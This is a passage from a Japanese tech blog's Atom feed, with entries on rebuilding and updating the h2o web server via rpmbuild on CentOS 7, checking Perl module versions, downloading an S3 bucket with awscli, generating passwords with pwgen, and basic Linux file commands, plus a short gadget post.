<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># ls -l ../SOURCES/</span></span><br><span class="line">合計 <span class="number">20</span></span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root  <span class="number">488</span>  <span class="number">2</span>月  <span class="number">9</span> <span class="number">12</span>:<span class="number">51</span> h2o.conf</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">2432</span>  <span class="number">2</span>月  <span class="number">9</span> <span class="number">12</span>:<span class="number">51</span> h2o.init</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root  <span class="number">190</span>  <span class="number">2</span>月  <span class="number">9</span> <span class="number">12</span>:<span class="number">51</span> h2o.logrotate</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root  <span class="number">342</span>  <span class="number">2</span>月  <span class="number">9</span> <span class="number">12</span>:<span class="number">51</span> h2o.service</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root  <span class="number">177</span>  <span class="number">2</span>月  <span class="number">9</span> <span class="number">12</span>:<span class="number">51</span> index.html</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># cp -p ../SOURCES<span class="comment">/* /root/rpmbuild/SOURCES/</span></span></span><br></pre></td></tr></table></figure>
<p>再度、rpmbuildをする。</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># rpmbuild -ba h2o.spec</span></span><br></pre></td></tr></table></figure>
<p>問題なければ、以下RPMファイルが作成できる。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># ls -l /root/rpmbuild/RPMS/x86_64/</span></span><br><span class="line">合計 <span class="number">6196</span></span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">1845760</span>  <span class="number">2</span>月  <span class="number">9</span> <span class="number">13</span>:<span class="number">09</span> h2o-<span class="number">1.6</span><span class="number">.3</span>-<span class="number">1.</span>el7.centos.x86_64.rpm</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">4241868</span>  <span class="number">2</span>月  <span class="number">9</span> <span class="number">13</span>:<span class="number">09</span> h2o-debuginfo-<span class="number">1.6</span><span class="number">.3</span>-<span class="number">1.</span>el7.centos.x86_64.rpm</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root  <span class="number">250784</span>  <span class="number">2</span>月  <span class="number">9</span> <span class="number">13</span>:<span class="number">09</span> h2o-devel-<span class="number">1.6</span><span class="number">.3</span>-<span class="number">1.</span>el7.centos.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h2 id="h2o_u30A2_u30C3_u30D7_u30C7_u30FC_u30C8"><a href="#h2o_u30A2_u30C3_u30D7_u30C7_u30FC_u30C8" class="headerlink" title="h2oアップデート"></a>h2oアップデート</h2><p>あとはrpmコマンドでアップデートするだけ。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># rpm -Uvh /root/rpmbuild/RPMS/x86_64/h2o-<span class="number">1.6</span><span class="number">.3</span>-<span class="number">1.</span>el7.centos.x86_64.rpm</span></span><br></pre></td></tr></table></figure>
<p>すでに起動している場合は、 daemonのリロードが必要なので、以下コマンドを実行。</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># systemctl daemon-reload</span></span><br><span class="line"><span class="preprocessor"># systemctl reload h2o.service</span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p>h2oのバージョンが上がっていたので、新しいバージョンのh2oのrpmファイルを作り、アップデート作業を行う。<br>@tatsushid さんが h2oをビルドするためのスペックファイルを準備してくれているので、こちらに甘えることとする。</p>
<p>また、コンパイルにはmakeが必要なので、 <code>cmake</code> をインストールしておく。</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># yum install cmake</span></span><br></pre></td></tr></table></figure>
<p>そもそもh2oとは？と疑問になる方は作者のKazuhoさんの記事<a href="http://blog.kazuhooku.com/2015/02/http-h2o.html">なぜ今、新しいHTTPサーバが必要なのか</a>をご覧ください。</p>]]>
    
    </summary>
    
      <category term="centos7" scheme="http://atani.github.io/tags/centos7/"/>
    
      <category term="h2o" scheme="http://atani.github.io/tags/h2o/"/>
    
      <category term="rpmbuild" scheme="http://atani.github.io/tags/rpmbuild/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[インストールされているperlモジュールのバージョン確認]]></title>
    <link href="http://atani.github.io/2016/02/perl-module-version/"/>
    <id>http://atani.github.io/2016/02/perl-module-version/</id>
    <published>2016-02-03T08:22:33.000Z</published>
    <updated>2016-02-09T04:33:55.000Z</updated>
    <content type="html"><![CDATA[<p>インストールされているperlモジュールのバージョンを確認したい。</p>
<p><code>perl -M&#39;モジュール名&#39; -e &#39;print $モジュール名::VERSION&#39;</code></p>
<p>実行例</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># perl -<span class="keyword">M</span>'<span class="keyword">Test</span>::<span class="keyword">More</span>' -<span class="keyword">e</span> '<span class="keyword">print</span> <span class="label">$Test</span>::<span class="keyword">More</span>::<span class="keyword">VERSION</span>'</span><br><span class="line">1.001003</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p>インストールされているperlモジュールのバージョンを確認したい。</p>
<p><code>perl -M&#39;モジュール名&#39; -e &#39;print $モジュール名::VERSION&#39;</code></p>
<p>実行例</p>
<figure ]]>
    </summary>
    
      <category term="perl" scheme="http://atani.github.io/tags/perl/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[AWSのS3にあるデータをawscliを使って一括でダウンロードする。]]></title>
    <link href="http://atani.github.io/2016/02/s3-collect-download/"/>
    <id>http://atani.github.io/2016/02/s3-collect-download/</id>
    <published>2016-02-02T05:29:06.000Z</published>
    <updated>2016-02-02T06:18:59.000Z</updated>
    <content type="html"><![CDATA[<p>AWS S3 の中に保存しているデータを全て手元にダウンロードする場合の手順。</p>
<h2 id="IAM_Management_Console_u3067_u306E_u8A2D_u5B9A"><a href="#IAM_Management_Console_u3067_u306E_u8A2D_u5B9A" class="headerlink" title="IAM Management Consoleでの設定"></a>IAM Management Consoleでの設定</h2><p>AWSのIAM Management Console にアクセスし、S3にアクセスするためのユーザーを作成するため、新規ユーザーの作成。</p>
<img src="/2016/02/s3-collect-download/aws1.png" alt="[aws1.png]" title="[aws1.png]">
<p>ユーザー名を入力して、作成する。</p>
<img src="/2016/02/s3-collect-download/aws2.png" alt="[aws2.png]" title="[aws2.png]">
<p>アクセスキーIDと、シークレットアクセスキーが表示されるので、メモしておく。(csvでダウンロードもできる) メモを忘れると、再度ユーザーを作り直したりする必要があるので、メモを忘れないようにする事。</p>
<img src="/2016/02/s3-collect-download/aws3.png" alt="[aws3.png]" title="[aws3.png]">
<p>IAMのトップページに戻り、作成したユーザーを選択する。<br>[アクセス許可] タブを選択し、[ポリシーのアタッチ] を選択する。</p>
<img src="/2016/02/s3-collect-download/aws4.png" alt="[aws4.png]" title="[aws4.png]">
<p>ポリシータイプで <code>AmazonS3ReadOnlyAccess</code> を検索し、チェックを入れ、ポリシーを作成する。</p>
<img src="/2016/02/s3-collect-download/aws5.png" alt="[aws5.png]" title="[aws5.png]">
<p>以下の通り、設定が入っていればweb画面での操作はOK.</p>
<img src="/2016/02/s3-collect-download/aws6.png" alt="[aws6.png]" title="[aws6.png]">
<h2 id="u30BF_u30FC_u30DF_u30CA_u30EB_u3067_u306E_u4F5C_u696D"><a href="#u30BF_u30FC_u30DF_u30CA_u30EB_u3067_u306E_u4F5C_u696D" class="headerlink" title="ターミナルでの作業"></a>ターミナルでの作業</h2><p>pythonが入っていれば、<code>pip</code>コマンドで<code>awscli</code>をインストールする。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install awscli</span></span><br><span class="line">Collecting awscli</span><br><span class="line">  Downloading awscli-<span class="number">1.10</span><span class="number">.1</span>-py2.py3-<span class="constant">none</span>-<span class="keyword">any</span>.whl (<span class="number">880</span>kB)</span><br><span class="line">    <span class="number">100</span>% |████████████████████████████████| <span class="number">884</span>kB <span class="number">703</span>kB/s</span><br><span class="line">Collecting docutils&gt;=<span class="number">0.10</span> (<span class="built_in">from</span> awscli)</span><br><span class="line">  Downloading docutils-<span class="number">0.12</span>-py3-<span class="constant">none</span>-<span class="keyword">any</span>.whl (<span class="number">508</span>kB)</span><br><span class="line">    <span class="number">100</span>% |████████████████████████████████| <span class="number">512</span>kB <span class="number">1.2</span>MB/s</span><br><span class="line">Collecting botocore==<span class="number">1.3</span><span class="number">.23</span> (<span class="built_in">from</span> awscli)</span><br><span class="line">  Downloading botocore-<span class="number">1.3</span><span class="number">.23</span>-py2.py3-<span class="constant">none</span>-<span class="keyword">any</span>.whl (<span class="number">2.2</span>MB)</span><br><span class="line">    <span class="number">100</span>% |████████████████████████████████| <span class="number">2.2</span>MB <span class="number">253</span>kB/s</span><br><span class="line">Collecting rsa&lt;=<span class="number">3.3</span><span class="number">.0</span>,&gt;=<span class="number">3.1</span><span class="number">.2</span> (<span class="built_in">from</span> awscli)</span><br><span class="line">  Downloading rsa-<span class="number">3.3</span>-py2.py3-<span class="constant">none</span>-<span class="keyword">any</span>.whl (<span class="number">44</span>kB)</span><br><span class="line">    <span class="number">100</span>% |████████████████████████████████| <span class="number">45</span>kB <span class="number">7.8</span>MB/s</span><br><span class="line">Collecting colorama&lt;=<span class="number">0.3</span><span class="number">.3</span>,&gt;=<span class="number">0.2</span><span class="number">.5</span> (<span class="built_in">from</span> awscli)</span><br><span class="line">  Downloading colorama-<span class="number">0.3</span><span class="number">.3</span>.tar.gz</span><br><span class="line">Collecting python-dateutil&lt;<span class="number">3.0</span><span class="number">.0</span>,&gt;=<span class="number">2.1</span> (<span class="built_in">from</span> botocore==<span class="number">1.3</span><span class="number">.23</span>-&gt;awscli)</span><br><span class="line">  Downloading python_dateutil-<span class="number">2.4</span><span class="number">.2</span>-py2.py3-<span class="constant">none</span>-<span class="keyword">any</span>.whl (<span class="number">188</span>kB)</span><br><span class="line">    <span class="number">100</span>% |████████████████████████████████| <span class="number">192</span>kB <span class="number">2.7</span>MB/s</span><br><span class="line">Collecting jmespath&lt;<span class="number">1.0</span><span class="number">.0</span>,&gt;=<span class="number">0.7</span><span class="number">.1</span> (<span class="built_in">from</span> botocore==<span class="number">1.3</span><span class="number">.23</span>-&gt;awscli)</span><br><span class="line">  Downloading jmespath-<span class="number">0.9</span><span class="number">.0</span>-py2.py3-<span class="constant">none</span>-<span class="keyword">any</span>.whl</span><br><span class="line">Collecting pyasn1&gt;=<span class="number">0.1</span><span class="number">.3</span> (<span class="built_in">from</span> rsa&lt;=<span class="number">3.3</span><span class="number">.0</span>,&gt;=<span class="number">3.1</span><span class="number">.2</span>-&gt;awscli)</span><br><span class="line">  Downloading pyasn1-<span class="number">0.1</span><span class="number">.9</span>-py2.py3-<span class="constant">none</span>-<span class="keyword">any</span>.whl</span><br><span class="line">Collecting <span class="constant">six</span>&gt;=<span class="number">1.5</span> (<span class="built_in">from</span> python-dateutil&lt;<span class="number">3.0</span><span class="number">.0</span>,&gt;=<span class="number">2.1</span>-&gt;botocore==<span class="number">1.3</span><span class="number">.23</span>-&gt;awscli)</span><br><span class="line">  Downloading <span class="constant">six</span>-<span class="number">1.10</span><span class="number">.0</span>-py2.py3-<span class="constant">none</span>-<span class="keyword">any</span>.whl</span><br><span class="line">Installing collected packages: docutils, <span class="constant">six</span>, python-dateutil, jmespath, botocore, pyasn1, rsa, colorama, awscli</span><br><span class="line">  Running setup.py install <span class="keyword">for</span> colorama</span><br><span class="line">Successfully installed awscli-<span class="number">1.10</span><span class="number">.1</span> botocore-<span class="number">1.3</span><span class="number">.23</span> colorama-<span class="number">0.3</span><span class="number">.3</span> docutils-<span class="number">0.12</span> jmespath-<span class="number">0.9</span><span class="number">.0</span> pyasn1-<span class="number">0.1</span><span class="number">.9</span> python-dateutil-<span class="number">2.4</span><span class="number">.2</span> rsa-<span class="number">3.3</span> <span class="constant">six</span>-<span class="number">1.10</span><span class="number">.0</span></span><br><span class="line">You are <span class="keyword">using</span> pip <span class="built_in">version</span> <span class="number">7.1</span><span class="number">.2</span>, however <span class="built_in">version</span> <span class="number">8.0</span><span class="number">.2</span> is available.</span><br><span class="line">You should consider upgrading via <span class="operator">the</span> <span class="string">'pip install --upgrade pip'</span> <span class="command"><span class="keyword">command</span>.</span></span><br></pre></td></tr></table></figure>
<p><code>awscli</code>が無事インストールされると、awsコマンドが使えるようになる。<br><code>aws configure</code>でawsにアクセスするための初期設定をする。<br>先ほど、メモしたアクセスキーとシークレットアクセスキーを入力。</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># aws configure</span><br><span class="line">AWS <span class="keyword">Access</span> Key ID [<span class="type">None</span>]: </span><br><span class="line">AWS Secret <span class="keyword">Access</span> Key [<span class="type">None</span>]: </span><br><span class="line"><span class="keyword">Default</span> region <span class="keyword">name</span> [<span class="type">None</span>]: </span><br><span class="line"><span class="keyword">Default</span> output <span class="keyword">format</span> [<span class="type">None</span>]:</span><br></pre></td></tr></table></figure>
<p><code>aws s3 ls s3://[bucket_name]</code> : S3の中身を閲覧し、アクセスできる事を確認する。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># aws <span class="literal">s3</span> ls <span class="literal">s3</span>://hogemoge</span><br><span class="line">                           PRE <span class="keyword">backgrounds/</span><br><span class="line"></span>                           PRE logos/</span><br></pre></td></tr></table></figure>
<p><code>aws s3 sync s3://[bucket_name] backup/</code> でS3にあるデータを全て取得できる。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># aws <span class="literal">s3</span> sync <span class="literal">s3</span>://[<span class="keyword">bucket_name] </span><span class="keyword">backup/</span><br><span class="line"></span><span class="label">download</span>: <span class="literal">s3</span>://hogemoge/logos/<span class="number">0</span>/original.png to <span class="keyword">backup_hogemoge/logos/0/original.png</span><br><span class="line"></span><span class="label">download</span>: <span class="literal">s3</span>://hogemoge/logos/<span class="number">0</span>/medium.jpg to <span class="keyword">backup_hogemoge/logos/0/medium.jpg</span></span><br></pre></td></tr></table></figure>
<p>取得できた事を確認できれば、作業完了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>AWS S3 の中に保存しているデータを全て手元にダウンロードする場合の手順。</p>
<h2 id="IAM_Management_Console_u3067_u306E_u8A2D_u5B9A"><a href="#IAM_Management_Console_u306]]>
    </summary>
    
      <category term="aws" scheme="http://atani.github.io/tags/aws/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ダンボーのLightningケーブルが可愛すぎる。]]></title>
    <link href="http://atani.github.io/2016/02/danboard-lightning/"/>
    <id>http://atani.github.io/2016/02/danboard-lightning/</id>
    <published>2016-01-31T16:52:23.000Z</published>
    <updated>2016-01-31T16:52:23.000Z</updated>
    <content type="html"><![CDATA[<p>外でPC作業するときに、短めのLightningケーブル欲しいなと思って探してたらダンボーのLightningケーブルに出会って衝動買いしてしまった。</p>
<p>商品到着後、パッケージにもダンボールで装飾(かわいい…)<br><img src="/2016/02/danboard-lightning/danboard2.jpg" alt="[danboard2.jpg]" title="[danboard2.jpg]"></p>
<p>そして、装着してみる…<br>ピカッ!!!!!</p>
<img src="/2016/02/danboard-lightning/danboard.gif" alt="[danboard.gif]" title="[danboard.gif]">
<p>かわいすぎる！！！</p>
<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?t=daystoremem-22&o=9&p=8&l=as1&asins=B00OH4I6RO&ref=qf_sp_asin_til&fc1=000000&IS2=1&lt1=_blank&m=amazon&lc1=0000FF&bc1=000000&bg1=FFFFFF&f=ifr" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>
]]></content>
    <summary type="html">
    <![CDATA[<p>外でPC作業するときに、短めのLightningケーブル欲しいなと思って探してたらダンボーのLightningケーブルに出会って衝動買いしてしまった。</p>
<p>商品到着後、パッケージにもダンボールで装飾(かわいい…)<br><img src="/2016/02/dan]]>
    </summary>
    
      <category term="gadgets" scheme="http://atani.github.io/tags/gadgets/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[macでパスワードを生成する]]></title>
    <link href="http://atani.github.io/2016/01/mac%E3%81%A7%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%82%92%E7%94%9F%E6%88%90%E3%81%99%E3%82%8B/"/>
    <id>http://atani.github.io/2016/01/macでパスワードを生成する/</id>
    <published>2016-01-07T13:24:00.000Z</published>
    <updated>2016-01-07T13:23:39.000Z</updated>
    <content type="html"><![CDATA[<img src="/2016/01/macでパスワードを生成する/passwd.png" alt="[passwd.png]" title="[passwd.png]">
<p>macでパスワードを作りたい場合、<code>pwgen</code>を使う。</p>
<h1 id="u5C0E_u5165_u65B9_u6CD5"><a href="#u5C0E_u5165_u65B9_u6CD5" class="headerlink" title="導入方法"></a>導入方法</h1><p>インストールは <code>Homebrew</code>を導入していれば<code>brew install</code>するだけ。</p>
<p><code>brew install pwgen</code></p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># brew install pwgen</span><br><span class="line">=<span class="ruby"><span class="status">=&gt;</span> <span class="constant">Downloading</span> <span class="symbol">https:</span>/<span class="regexp">/downloads.sourceforge.net/project</span><span class="regexp">/pwgen/pwgen</span><span class="regexp">/2.07/pwgen</span>-<span class="number">2.07</span>.tar.gz</span><br><span class="line"></span>=<span class="ruby"><span class="status">=&gt;</span> <span class="constant">Downloading</span> from <span class="symbol">http:</span>/<span class="regexp">/jaist.dl.sourceforge.net/project</span><span class="regexp">/pwgen/pwgen</span><span class="regexp">/2.07/pwgen</span>-<span class="number">2.07</span>.tar.gz</span><br><span class="line"></span>######################################################################## 100.0%</span><br><span class="line">=<span class="ruby"><span class="status">=&gt;</span> ./configure --prefix=<span class="regexp">/usr/local</span><span class="regexp">/Cellar/pwgen</span><span class="regexp">/2.07 --mandir=/usr</span><span class="regexp">/local/</span><span class="constant">Cellar</span>/pwgen/<span class="number">2.07</span>/share/man</span><br><span class="line"></span>=<span class="ruby"><span class="status">=&gt;</span> make install</span></span><br></pre></td></tr></table></figure>
<h1 id="u4F7F_u3044_u65B9"><a href="#u4F7F_u3044_u65B9" class="headerlink" title="使い方"></a>使い方</h1><a id="more"></a>
<p><code>pwgen</code> を実行するだけで、８桁のパスワードをたくさん出してくれるが、オプションを渡すことでさらに複雑なパスワードや逆に簡単なパスワードを生成することができる。</p>
<p><code>Usage: pwgen [ OPTIONS ] [ pw_length ] [ num_pw ]</code></p>
<h2 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h2><table>
<thead>
<tr>
<th>OPTION</th>
<th>Content</th>
</tr>
</thead>
<tbody>
<tr>
<td>-c –capitalize</td>
<td>パスワードに最低1文字は大文字を含める(デフォルト)</td>
</tr>
<tr>
<td>-A –no-capitalize</td>
<td>パスワードに大文字を含めない</td>
</tr>
<tr>
<td>-n –numerals</td>
<td>パスワードに最低1文字は数字を含める(デフォルト)</td>
</tr>
<tr>
<td>-0 –no-numerals</td>
<td>パスワードに数字を含めない</td>
</tr>
<tr>
<td>-y –symbols</td>
<td>パスワードに最低1文字は特殊文字を含める</td>
</tr>
<tr>
<td>-s –secure</td>
<td>完全にランダムなパスワードを生成する。</td>
</tr>
<tr>
<td>-B –ambiguous</td>
<td>パスワードに曖昧な文字は含めない(0とO等)</td>
</tr>
<tr>
<td>-h –help</td>
<td>使い方を表示する</td>
</tr>
<tr>
<td>-H –sha1=path/to/file[#seed]</td>
<td>ランダムなパスワードをファイルのsha1ハッシュを使用する</td>
</tr>
<tr>
<td>-C</td>
<td>列にパスワードを表示する(デフォルト)</td>
</tr>
<tr>
<td>-1</td>
<td>列にパスワードを表示しない(1行1パスワード)</td>
</tr>
<tr>
<td>-v –no-vowels</td>
<td>偶然の不快な言葉を避けるために母音を使用しない</td>
</tr>
</tbody>
</table>
<h2 id="pw_length"><a href="#pw_length" class="headerlink" title="pw_length"></a>pw_length</h2><p>パスワードの文字数を指定する。</p>
<h2 id="num_pw"><a href="#num_pw" class="headerlink" title="num_pw"></a>num_pw</h2><p>パスワードの生成数を指定する。</p>
<h1 id="u4F8B"><a href="#u4F8B" class="headerlink" title="例"></a>例</h1><p>試しに使ってみよう。</p>
<ul>
<li>以下の条件で、実行する。<ul>
<li>数字を含めない</li>
<li>パスワードは10文字</li>
<li>パスワードを5つ生成する。</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># pwgen -<span class="number">0</span> <span class="number">10</span> <span class="number">5</span></span></span><br><span class="line">waijahgahM aeRahkemoo keeCeithoh Haeshaecam OhmieGeefa</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<img src="/2016/01/macでパスワードを生成する/passwd.png" alt="[passwd.png]" title="[passwd.png]">
<p>macでパスワードを作りたい場合、<code>pwgen</code>を使う。</p>
<h1 id="u5C0E_u5165_u65B9_u6CD5"><a href="#u5C0E_u5165_u65B9_u6CD5" class="headerlink" title="導入方法"></a>導入方法</h1><p>インストールは <code>Homebrew</code>を導入していれば<code>brew install</code>するだけ。</p>
<p><code>brew install pwgen</code></p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># brew install pwgen</span><br><span class="line">=<span class="ruby"><span class="status">=&gt;</span> <span class="constant">Downloading</span> <span class="symbol">https:</span>/<span class="regexp">/downloads.sourceforge.net/project</span><span class="regexp">/pwgen/pwgen</span><span class="regexp">/2.07/pwgen</span>-<span class="number">2.07</span>.tar.gz</span><br><span class="line"></span>=<span class="ruby"><span class="status">=&gt;</span> <span class="constant">Downloading</span> from <span class="symbol">http:</span>/<span class="regexp">/jaist.dl.sourceforge.net/project</span><span class="regexp">/pwgen/pwgen</span><span class="regexp">/2.07/pwgen</span>-<span class="number">2.07</span>.tar.gz</span><br><span class="line"></span>######################################################################## 100.0%</span><br><span class="line">=<span class="ruby"><span class="status">=&gt;</span> ./configure --prefix=<span class="regexp">/usr/local</span><span class="regexp">/Cellar/pwgen</span><span class="regexp">/2.07 --mandir=/usr</span><span class="regexp">/local/</span><span class="constant">Cellar</span>/pwgen/<span class="number">2.07</span>/share/man</span><br><span class="line"></span>=<span class="ruby"><span class="status">=&gt;</span> make install</span></span><br></pre></td></tr></table></figure>
<h1 id="u4F7F_u3044_u65B9"><a href="#u4F7F_u3044_u65B9" class="headerlink" title="使い方"></a>使い方</h1>]]>
    
    </summary>
    
      <category term="linux" scheme="http://atani.github.io/tags/linux/"/>
    
      <category term="mac" scheme="http://atani.github.io/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[現場で必須！超基本Linuxコマンド Vol.3]]></title>
    <link href="http://atani.github.io/2015/11/linux-command-3/"/>
    <id>http://atani.github.io/2015/11/linux-command-3/</id>
    <published>2015-11-05T17:13:02.000Z</published>
    <updated>2015-11-05T17:13:02.000Z</updated>
    <content type="html"><![CDATA[<p>今回はファイルの中身を見たり検索したりしてみよう。</p>
<p>まず事前に中身のあるファイルを用意する。</p>
<p>全て見知らぬコマンドを利用しているが今回はこの説明は割愛する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># seq -w <span class="number">1</span> <span class="number">10</span> &gt;sample1.txt</span></span><br><span class="line"><span class="preprocessor"># cat sample1.txt</span></span><br><span class="line"><span class="number">01</span></span><br><span class="line"><span class="number">02</span></span><br><span class="line"><span class="number">03</span></span><br><span class="line"><span class="number">04</span></span><br><span class="line"><span class="number">05</span></span><br><span class="line"><span class="number">06</span></span><br><span class="line"><span class="number">07</span></span><br><span class="line"><span class="number">08</span></span><br><span class="line"><span class="number">09</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><p>主にファイルの内容を表示するために利用する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># cat sample1.txt</span></span><br><span class="line"><span class="number">01</span></span><br><span class="line"><span class="number">02</span></span><br><span class="line"><span class="number">03</span></span><br><span class="line"><span class="number">04</span></span><br><span class="line"><span class="number">05</span></span><br><span class="line"><span class="number">06</span></span><br><span class="line"><span class="number">07</span></span><br><span class="line"><span class="number">08</span></span><br><span class="line"><span class="number">09</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
<h1 id="head"><a href="#head" class="headerlink" title="head"></a>head</h1><p>先頭10行を表示する。<br><code>-n number</code>のオプションを指定することで、指定行数表示する。 </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># head -n5 sample1.txt</span></span><br><span class="line"><span class="number">01</span></span><br><span class="line"><span class="number">02</span></span><br><span class="line"><span class="number">03</span></span><br><span class="line"><span class="number">04</span></span><br><span class="line"><span class="number">05</span></span><br></pre></td></tr></table></figure>
<h1 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h1><p>末尾10行を表示する。<br><code>-n number</code>のオプションを指定することで、指定行数表示する。 </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># tail -n5 sample1.txt</span></span><br><span class="line"><span class="number">06</span></span><br><span class="line"><span class="number">07</span></span><br><span class="line"><span class="number">08</span></span><br><span class="line"><span class="number">09</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
<h1 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h1><p>検索文字列に一致する行を検索して出力する。正規表現も利用可能。</p>
<p>例: <code>sample1.txt</code>の中から<code>1</code>という文字が入っている行を表示する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># grep <span class="number">1</span> sample1.txt</span></span><br><span class="line"><span class="number">01</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
<h1 id="7C__28_u30D1_u30A4_u30D7_29"><a href="#7C__28_u30D1_u30A4_u30D7_29" class="headerlink" title="| (パイプ)"></a>| (パイプ)</h1><p>複数の処理の入出力をつなぐための仕組み。</p>
<p>例: <code>sample1.txt</code>の中から先頭５行の中から<code>1</code>という文字が入っている行を表示する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># head -n5 sample1.txt | grep <span class="number">1</span></span></span><br><span class="line"><span class="number">01</span></span><br></pre></td></tr></table></figure>
<p>パイプを使うことでより絞り込んだ検索をすることができるようになる。</p>
